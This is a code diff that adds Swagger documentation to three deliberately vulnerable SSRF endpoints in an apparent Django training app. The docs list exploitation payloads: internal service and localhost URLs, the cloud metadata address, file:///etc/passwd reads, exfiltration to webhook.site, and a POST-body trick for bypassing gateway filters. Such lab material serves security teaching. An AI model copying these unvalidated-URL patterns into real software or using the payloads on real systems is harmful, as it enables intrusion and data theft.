@@ -2,6 +2,8 @@ from rest_framework import viewsets, status
 from rest_framework.decorators import action
 from rest_framework.response import Response
 from rest_framework.permissions import AllowAny
+from drf_yasg.utils import swagger_auto_schema
+from drf_yasg import openapi
 import requests
 import re
 from urllib.parse import urlparse
@@ -69,6 +71,66 @@ class ProductViewSet(viewsets.ModelViewSet):
             return Response(serializer.data, status=status.HTTP_201_CREATED)
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
 
+    @swagger_auto_schema(
+        method='get',
+        operation_description="""
+        **🚨 SSRF VULNERABILITY - Price Comparison Feature**
+        
+        This endpoint fetches prices from external websites for comparison.
+        **VULNERABLE:** Server makes HTTP request to user-provided URL without validation.
+        
+        **Exploitation Examples:**
+        - Internal services: `?compare_url=http://user-service:8081/api/users`
+        - Localhost: `?compare_url=http://127.0.0.1:8081`
+        - Private IPs: `?compare_url=http://192.168.1.1`
+        - Metadata: `?compare_url=http://169.254.169.254/latest/meta-data/`
+        
+        **Note:** API Gateway may block some patterns in query parameters.
+        Try POST body instead: `{"compare_url": "http://internal-service"}`
+        """,
+        manual_parameters=[
+            openapi.Parameter(
+                'compare_url',
+                openapi.IN_QUERY,
+                description="URL of website to compare prices (⚠️ VULNERABLE - accepts any URL)",
+                type=openapi.TYPE_STRING,
+                required=True,
+                example="http://localhost:8081/api/users"
+            )
+        ],
+        responses={
+            200: openapi.Response(
+                description="Price comparison result with fetched content",
+                examples={
+                    "application/json": {
+                        "product_name": "Sample Product",
+                        "compare_url": "http://example.com",
+                        "status_code": 200,
+                        "found_prices": ["$99", "$149"],
+                        "content_preview": "HTML content from fetched URL..."
+                    }
+                }
+            ),
+            400: "Invalid or unreachable URL"
+        },
+        tags=['SSRF Vulnerable']
+    )
+    @swagger_auto_schema(
+        method='post',
+        operation_description="**POST version** - May bypass API Gateway filters that only check query parameters",
+        request_body=openapi.Schema(
+            type=openapi.TYPE_OBJECT,
+            required=['compare_url'],
+            properties={
+                'compare_url': openapi.Schema(
+                    type=openapi.TYPE_STRING,
+                    description="Target URL (⚠️ VULNERABLE)",
+                    example="http://user-service:8081/api/users"
+                )
+            }
+        ),
+        tags=['SSRF Vulnerable']
+    )
     @action(detail=True, methods=['get', 'post'])
     def check_price(self, request, pk=None):
         """
@@ -129,6 +191,45 @@ class ProductViewSet(viewsets.ModelViewSet):
                 'compare_url': compare_url
             }, status=status.HTTP_400_BAD_REQUEST)
 
+    @swagger_auto_schema(
+        method='get',
+        operation_description="""
+        **🚨 SSRF VULNERABILITY - Review Fetcher**
+        
+        Fetches product reviews from external blogs/websites.
+        **VULNERABLE:** Server fetches full HTML content from user-provided URL.
+        
+        **Exploitation:**
+        - Exfiltrate internal data: `?review_url=http://user-service:8081/actuator/env`
+        - Read local files: `?review_url=file:///etc/passwd` (if file:// allowed)
+        - Blind SSRF: Use webhook.site to confirm server-side requests
+        """,
+        manual_parameters=[
+            openapi.Parameter(
+                'review_url',
+                openapi.IN_QUERY,
+                description="URL of review page (⚠️ VULNERABLE)",
+                type=openapi.TYPE_STRING,
+                required=True,
+                example="http://product-service:8082/admin/"
+            )
+        ],
+        tags=['SSRF Vulnerable']
+    )
+    @swagger_auto_schema(
+        method='post',
+        request_body=openapi.Schema(
+            type=openapi.TYPE_OBJECT,
+            required=['review_url'],
+            properties={
+                'review_url': openapi.Schema(
+                    type=openapi.TYPE_STRING,
+                    example="http://localhost:8081"
+                )
+            }
+        ),
+        tags=['SSRF Vulnerable']
+    )
     @action(detail=True, methods=['get', 'post'])
     def fetch_review(self, request, pk=None):
         """
@@ -189,6 +290,47 @@ class ProductViewSet(viewsets.ModelViewSet):
                 'review_url': review_url
             }, status=status.HTTP_400_BAD_REQUEST)
 
+    @swagger_auto_schema(
+        method='get',
+        operation_description="""
+        **🚨 SSRF VULNERABILITY - Social Media Sharing (POST Request)**
+        
+        POSTs product information to social media APIs.
+        **VULNERABLE:** Server makes POST request to user-controlled URL.
+        
+        **Exploitation:**
+        - Send data to attacker server: `?share_api_url=https://webhook.site/your-id`
+        - Trigger internal webhooks: `?share_api_url=http://internal-webhook:8080/trigger`
+        - Attack internal services with POST data
+        
+        **Unique:** This is SSRF with POST method, not just GET!
+        """,
+        manual_parameters=[
+            openapi.Parameter(
+                'share_api_url',
+                openapi.IN_QUERY,
+                description="Social media API endpoint (⚠️ VULNERABLE - accepts any URL)",
+                type=openapi.TYPE_STRING,
+                required=True,
+                example="https://webhook.site/unique-id"
+            )
+        ],
+        tags=['SSRF Vulnerable']
+    )
+    @swagger_auto_schema(
+        method='post',
+        request_body=openapi.Schema(
+            type=openapi.TYPE_OBJECT,
+            required=['share_api_url'],
+            properties={
+                'share_api_url': openapi.Schema(
+                    type=openapi.TYPE_STRING,
+                    example="http://internal-service:8080/webhook"
+                )
+            }
+        ),
+        tags=['SSRF Vulnerable']
+    )
     @action(detail=True, methods=['get', 'post'])
     def share(self, request, pk=None):
         """
